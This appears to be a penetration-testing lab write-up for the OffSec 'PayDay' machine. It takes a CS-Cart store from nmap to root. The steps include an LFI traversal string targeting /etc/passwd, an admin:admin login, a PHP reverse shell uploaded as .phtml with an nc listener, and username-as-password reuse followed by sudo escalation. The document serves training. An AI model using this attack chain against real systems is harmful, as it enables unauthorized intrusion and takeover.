![PayDay attack path](/images/lab-writeups/payday.svg)

# PayDay Write-Up

Source: OffSec

Difficulty: Intermediate

Categories: Linux, CS-Cart, authenticated RCE, file manager upload, PHP webshell, SSH, sudo

## Nmap Scan

The scan showed:

```text
22/tcp  open  ssh     OpenSSH 4.6p1 Debian
80/tcp  open  http    Apache httpd 2.2.4, PHP/5.2.3
110/tcp open  pop3    Dovecot pop3d
139/tcp open  Samba
143/tcp open  imap    Dovecot imapd
445/tcp open  Samba 3.0.26a
993/tcp open  ssl/imap
995/tcp open  ssl/pop3
```

Port 80 identified the application:

```text
CS-Cart. Powerful PHP shopping cart software
```

## Initial Web Enumeration

Searchsploit showed multiple CS-Cart results. The unauthenticated LFI result was reviewed first:

```text
CS-Cart unauthenticated LFI
classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
```

The path did not produce useful results during testing, so the next candidate was authenticated RCE.

Relevant exploit note:

```text
CS-Cart authenticated RCE
Upload PHP shells through file manager.
Change extension from .php to .phtml.
Visit /skins/shell.phtml.
```

## Directory Enumeration

Gobuster found several paths:

```text
/images
/index
/image
/catalog
/admin
/skins
/core
/install
/include
/classes
/config
/addons
/var
/payments
/init
/prepare
```

The `/admin` page was accessible. The credentials worked:

```text
admin:admin
```

## Authenticated RCE

The goal was to use the CS-Cart file manager to upload a PHP reverse shell. The uploaded file was renamed from `.php` to `.phtml` so it would execute in the target environment.

Payload workflow:

1. Prepare a PHP reverse shell.
2. Update listener IP and port.
3. Upload through the admin file manager.
4. Rename or save as `.phtml`.
5. Visit the shell path under `/skins/`.

Example trigger path:

```text
http://192.168.143.39/skins/pentestmonkeyrevshell.phtml
```

Start a listener:

```bash
nc -nvlp 4444
```

Triggering the `.phtml` returned a shell.

## Privilege Escalation

After landing the shell, local enumeration showed a user named `patrick`.

The password was the same as the username:

```text
patrick:patrick
```

SSH on the host was old, and modern clients or tools could fail due to disabled algorithms:

```text
kex error: no match for method mac algo client->server
```

The server offered older MACs such as:

```text
hmac-md5
hmac-sha1
hmac-ripemd160
hmac-sha1-96
hmac-md5-96
```

This indicated an older OpenSSH version. Modern clients may require explicit legacy algorithm options.

Once authenticated as `patrick`, check sudo:

```bash
sudo -l
```

The user had sudo privileges, allowing root access and retrieval of:

```bash
cat /root/proof.txt
```

## Attack Chain

```text
Nmap
-> CS-Cart on Apache/PHP
-> Directory enumeration finds /admin and /skins
-> admin:admin login succeeds
-> File manager upload
-> PHP reverse shell renamed to .phtml
-> Webshell execution from /skins
-> Shell as web user
-> Local user patrick discovered
-> patrick:patrick credential reuse
-> sudo privileges
-> root shell and proof.txt
```

## Lessons Learned

When an LFI exploit does not work, move to other version-relevant exploit paths instead of forcing one technique.

Authenticated RCE is still valid if weak or default credentials are present.

If unfamiliar with an admin interface, researching the product's normal file-upload workflow is part of practical enumeration.

Old SSH services may require older MAC or key-exchange algorithms.

Try username-equals-password against local users when the environment suggests weak credential hygiene.

Always run `sudo -l` after obtaining a shell or SSH access.
